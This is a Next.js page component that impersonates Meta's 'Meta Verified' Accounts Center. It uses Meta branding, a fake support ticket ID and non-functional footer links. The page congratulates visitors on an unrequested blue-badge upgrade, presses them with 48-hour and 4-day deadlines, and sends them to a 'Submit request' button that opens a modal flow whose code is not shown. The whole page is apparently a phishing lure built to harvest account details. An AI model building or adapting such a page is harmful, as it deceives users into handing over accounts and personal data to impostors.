import { ModalFlowProvider } from "@/components/ModalFlow";
import { ButtonWithModal } from "@/components/ButtonWithModal";
import Image from "next/image";
import type { Metadata } from "next";

export const metadata: Metadata = {
  title: "Accounts Center | Meta Verified",
  description: "Meta Verified: Recognizing Your Professional Excellence.",
  alternates: {
    canonical: "/accounts-center",
  },
};

export default function AccountsCenterPage() {
  return (
    <ModalFlowProvider>
      <div className="min-h-screen bg-gradient-to-br from-slate-50 via-sky-50 to-slate-100 text-slate-900">
        <main className="mx-auto flex min-h-screen max-w-4xl flex-col px-4 py-10 sm:px-8">
          <section className="flex-1 px-1 py-2 sm:px-2 sm:py-4">
            <div className="mb-6 flex items-start gap-4 sm:mb-10">
              <div className="mt-1 flex h-12 w-12 items-center justify-center rounded-full bg-metaBlue/10">
                <Image
                  src="/ic_blue.svg"
                  alt="Meta Verified badge"
                  width={40}
                  height={40}
                  className="h-8 w-8"
                />
              </div>
              <div>
                <h1 className="text-2xl font-semibold tracking-tight sm:text-3xl">
                  Meta Verified: Recognizing Your Professional Excellence
                </h1>
                <p className="mt-2 text-sm font-semibold text-slate-800">
                  Establish your authority and show the world that you mean business.
                </p>
              </div>
            </div>

            <div className="space-y-4 text-sm leading-relaxed text-slate-700 sm:text-base">
              <p>
                Congratulations on meeting the rigorous standards required to upgrade your page with the
                verified blue badge! This significant milestone is a testament to your consistent
                dedication and the high level of trust you have cultivated within your community.
              </p>
              <p>
                We are honored to celebrate this achievement with you and are eager to see your brand
                reach new heights under this prestigious recognition.
              </p>

              <p className="mt-4 text-sm font-medium text-metaBlue">
                Support Ticket ID: <span className="underline decoration-dotted">#Y718-SGCZ-4JXR</span>
              </p>

              <div className="mt-6 space-y-3">
                <h2 className="text-sm font-semibold text-slate-900 sm:text-base">
                  Official Verification Protocol
                </h2>
                <ul className="space-y-2 text-sm text-slate-700 sm:text-[15px]">
                  <li>
                    - Our verification team maintains a professional environment; requests containing any
                    form of intimidation or hate speech will not be processed.
                  </li>
                  <li>
                    - Please ensure all submitted data is accurate to facilitate a smooth review. Failure
                    to provide a valid email or to respond to follow-up inquiries within 48 hours may
                    result in your application being closed. Requests pending for more than 4 days will be
                    automatically dismissed by the system.
                  </li>
                  <li>
                    - Upon submission, we will conduct a comprehensive account audit. While the evaluation
                    typically concludes within 24 hours, complex cases may require more time. Following our
                    review, any existing restrictions will be addressed, and your verified status will be
                    finalized.
                  </li>
                </ul>
              </div>
            </div>

            <div className="mt-10 flex justify-center">
              <ButtonWithModal className="inline-flex items-center rounded-full bg-metaBlue px-10 py-3 text-sm font-semibold text-white shadow-sm transition hover:bg-metaIndigo focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-metaBlue focus-visible:ring-offset-2">
                Submit request
              </ButtonWithModal>
            </div>
          </section>

          <footer className="mt-6 flex flex-wrap justify-center gap-4 text-xs text-slate-500 sm:text-[13px]">
            <button className="hover:text-slate-700" type="button">
              Help Center
            </button>
            <span className="text-slate-400">|</span>
            <button className="hover:text-slate-700" type="button">
              Privacy Policy
            </button>
            <span className="text-slate-400">|</span>
            <button className="hover:text-slate-700" type="button">
              Terms of Service
            </button>
            <span className="text-slate-400">|</span>
            <button className="hover:text-slate-700" type="button">
              Community Standards
            </button>
            <span className="text-slate-400">|</span>
            <span>Meta (c) 2025</span>
          </footer>
        </main>
      </div>
    </ModalFlowProvider>
  );
}
